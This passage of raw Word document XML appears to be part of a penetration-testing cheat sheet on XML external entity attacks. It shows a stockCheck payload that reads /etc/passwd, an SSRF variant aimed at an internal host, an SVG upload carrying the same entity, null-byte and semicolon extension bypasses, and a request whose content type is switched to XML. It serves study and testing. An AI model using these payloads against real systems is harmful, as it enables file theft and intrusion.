        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>productId</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&gt;&lt;/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>stockCheck</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">&lt;!-- Alter to include a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>doctype</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> that references a local file with a new `&amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>;` entity --&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">&lt;!DOCTYPE foo [ &lt;!ENTITY </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> SYSTEM "fil</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>e:///etc/passwd"&gt; ]&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>stockCheck</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&gt;&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>productId</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&gt;&amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>;&lt;/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>productId</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&gt;&lt;/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>stockCheck</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Perform SSRF attack</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">Induce the application to make a request and return the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>resonse</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> from an internal system:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&lt;!--</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Reponse</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> will include response from http://internal.vulnerable-webs</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>ite.com/ if output is displayed to the user</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>Otherwise, this is a blind XXE attack</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>--&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">&lt;!DOCTYPE foo [ &lt;!ENTITY </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> SYSTEM "http://internal.vulnerable-website.com/"&gt; ]&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>stockCheck</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&gt;&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>productId</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&gt;&amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>;&lt;/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>productId</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&gt;&lt;/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>stockCh</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>eck</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>XXE via file upload</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>If an application allows XML to be uploaded.  This can include SVG files, which are XML.  For example, an SVG file that displays a message:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&lt;?xml</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> version="1.0" encoding="UTF-8"?&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">&lt;!DOCTYPE foo [ &lt;!ENTITY </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> SYSTEM "file:///etc/pas</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>swd"&gt; ]&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>svg</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xmlns</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>="http://www.w3.org/2000/svg" width="100" height="100"&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  &lt;text x="0" y="15" fill="red"&gt;&amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>;&lt;/text&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>svg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">It may also be possible to cause the server to accept an SVG file even if it only accepts PNG or JGP image types by changing the </w:t>
      </w:r>
      <w:r>
        <w:t>file extension:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>null</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> byte and semicolon termination</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>malicious.svg%00.jpg</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>malicious.svg;.jpg`</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>XXE via modified content type</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Although an application may expect to receive request payloads in a specific type, it may be tolerant of XML payloads:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t># Expected f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>ormat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>POST /action HTTP/1.0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>Content-Type: application/x-www-form-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>urlencoded</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>Content-Length: 7</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>foo=bar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t># Tolerates XML instead, at which point, XXE attacks can be attempted</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>POST /action HTTP/1.0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>Content-Type: text/xml</w:t>
      </w:r>
      <w:r>
        <w:rPr>
